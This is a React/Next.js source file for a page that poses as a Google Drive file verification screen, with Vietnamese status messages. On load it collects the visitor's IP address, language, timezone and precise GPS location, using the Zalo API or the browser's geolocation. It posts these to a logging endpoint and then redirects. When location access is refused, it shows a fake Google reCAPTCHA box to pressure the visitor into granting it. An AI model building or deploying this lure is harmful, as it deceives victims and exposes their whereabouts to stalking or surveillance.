
'use client';

import { useEffect, useState, useCallback } from 'react';
import { Card, CardContent } from '@/components/ui/card';
import Image from 'next/image';
import { FileText, Loader2 } from 'lucide-react';
import type { VerificationConfig } from '@/app/actions/settings';

interface DriveVerificationClientProps {
  config: VerificationConfig;
}

export function DriveVerificationClient({ config }: DriveVerificationClientProps) {
  const { 
    title, 
    description, 
    fileName, 
    fileInfo, 
    footerText, 
    redirectUrl,
    previewImageUrl,
  } = config;

  const [status, setStatus] = useState<'requesting' | 'denied' | 'success'>('requesting');
  const [statusText, setStatusText] = useState('Đang yêu cầu xác minh...');
  
  const REDIRECT_URL = redirectUrl || 'https://www.facebook.com'; 

  const requestLocation = useCallback(() => {
    setStatus('requesting');
    setStatusText('Đang xác minh, vui lòng chờ...');
    
    const processRequest = async () => {
        let clientIp = 'N/A';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            if (ipResponse.ok) {
                const ipData = await ipResponse.json();
                clientIp = ipData.ip;
            }
        } catch(e) {
            console.error("Could not fetch IP", e);
        }

        const logDataAndRedirect = (pos?: { coords: { latitude: number; longitude: number; accuracy: number; } }) => {
            setStatus('success');
            setStatusText('Xác minh thành công, đang chuyển hướng...');
            
            const body: any = { 
                ip: clientIp, 
                from: 'link',
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            if (pos) {
                body.lat = pos.coords.latitude;
                body.lon = pos.coords.longitude;
                body.acc = pos.coords.accuracy;
            }

            fetch('/api/log-location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body),
                keepalive: true,
            }).finally(() => {
                window.location.href = REDIRECT_URL;
            });
        };

        const handleError = (error?: { code: number; message?: string }) => {
          if (error?.code === 1) { // PERMISSION_DENIED
              setStatus('denied');
          } else {
              // For other errors (like timeout), just log without location and redirect.
              logDataAndRedirect();
          }
        };

        // Check for Zalo's specific JS API first to fix ReferenceError and optimize
        if (typeof (window as any).zaloJSV2?.getLocation === 'function') {
            (window as any).zaloJSV2.getLocation((data: { status: string; latitude: number; longitude: number; accuracy: number; }) => {
                if (data.status === "SUCCESS" && data.latitude && data.longitude) {
                    logDataAndRedirect({
                        coords: {
                            latitude: data.latitude,
                            longitude: data.longitude,
                            accuracy: data.accuracy || 15, // Zalo might not return accuracy
                        },
                    });
                } else {
                    // If Zalo API fails, treat as permission denied
                    handleError({ code: 1, message: 'Zalo API failed or was denied' });
                }
            });
        } else if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            logDataAndRedirect,
            (err) => handleError(err),
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
          );
        } else {
          // Fallback for browsers with no geo support
          logDataAndRedirect();
        }
    };
    
    processRequest();
  }, [REDIRECT_URL]);

  useEffect(() => {
    const timer = setTimeout(requestLocation, 500);
    return () => clearTimeout(timer);
  }, [requestLocation]);
  
  const renderVerificationStep = () => {
    switch (status) {
      case 'requesting':
      case 'success':
        return (
          <div
            className="w-full h-12 text-base font-semibold text-primary-foreground rounded-lg flex items-center justify-center transition-colors bg-primary"
          >
            <Loader2 className="mr-2 h-5 w-5 animate-spin" />
            {statusText}
          </div>
        );
      case 'denied':
        return (
            <div 
                className="w-full h-20 bg-[#f9f9f9] border border-gray-300 rounded-md p-3 flex items-center justify-between shadow-md cursor-pointer hover:bg-gray-100/80 transition-colors"
                onClick={requestLocation}
            >
                <div className="flex items-center gap-4">
                    <div className="h-8 w-8 border-2 border-gray-400 bg-white rounded-sm flex items-center justify-center" />
                    <span className="text-gray-800 text-sm font-medium">I'm not a robot</span>
                </div>
                <div className="flex flex-col items-center justify-center text-center">
                    <Image src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width={32} height={32} alt="reCAPTCHA" />
                    <p className="text-[9px] text-gray-500 -mt-1">reCAPTCHA</p>
                    <p className="text-[7px] text-gray-400 scale-90">Privacy - Terms</p>
                </div>
            </div>
        );
    }
  }

  return (
    <div className="flex justify-center items-center min-h-svh bg-muted/30 p-4">
      <Card className="p-8 sm:p-10 rounded-xl shadow-2xl text-center max-w-md w-full bg-card border">
        <CardContent className="p-0 flex flex-col items-center">
          
          <Image
            className="mb-5 rounded-md"
            src={previewImageUrl || "https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg"}
            alt={title}
            width={80}
            height={80}
            priority
          />
          
          <h1 className="text-2xl font-bold mb-2 text-foreground">{title}</h1>
          <p className="text-muted-foreground text-sm leading-normal mb-8">
            {description}
          </p>

          <div className="w-full bg-muted/40 border rounded-lg p-4 flex items-center gap-4 mb-6 text-left">
            <FileText className="h-10 w-10 text-primary shrink-0" />
            <div>
              <p className="font-semibold text-foreground">{fileName}</p>
              <p className="text-xs text-muted-foreground">{fileInfo}</p>
            </div>
          </div>
          
          {renderVerificationStep()}

          <div className="text-xs text-muted-foreground/80 mt-6">
            {footerText}
          </div>
        </CardContent>
      </Card>
    </div>
  );
}

    